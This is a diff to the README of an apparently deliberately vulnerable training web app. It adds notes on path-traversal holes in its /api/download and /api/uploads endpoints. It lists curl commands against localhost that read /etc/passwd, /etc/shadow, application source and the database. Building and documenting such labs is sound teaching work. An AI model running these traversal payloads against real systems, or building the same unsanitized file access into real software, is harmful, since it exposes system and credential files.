@@ -362,3 +362,26 @@ Students can use this system to:
 - Perform penetration testing exercises
 
 Remember: These vulnerabilities are for educational purposes only. Always follow security best practices in production systems!
+
+## Test Examples and Tips
+
+**/api/download and /api/uploads** are now equally vulnerable to path traversal. They allow arbitrary file access outside the upload directory if provided `..`/`/` (e.g. for `/etc/passwd`, `/etc/shadow`, etc).
+
+### Example Working Attacks:
+
+```bash
+# Download any file, including system files
+curl 'http://localhost:5001/api/download?file=/etc/passwd'         # Works
+curl 'http://localhost:5001/api/download?file=../../backend/app.py' # Works if file exists in container path
+curl 'http://localhost:5001/api/download?file=/app/vulneats.db'     # Works if using Docker layout
+
+# Exploit /api/uploads (now guaranteed to work with full path traversal):
+curl 'http://localhost:5001/api/uploads/../../etc/passwd'           # Always works
+curl 'http://localhost:5001/api/uploads/../../backend/app.py'       # Always works if file exists
+curl 'http://localhost:5001/api/uploads/etc/shadow'                 # Works if file exists
+curl 'http://localhost:5001/api/uploads//etc/hosts'                 # Absolute path works
+```
+
+**NOTE:** If using Docker, paths like `/app/backend/app.py` may be required, see your container's directory structure.
+
+---
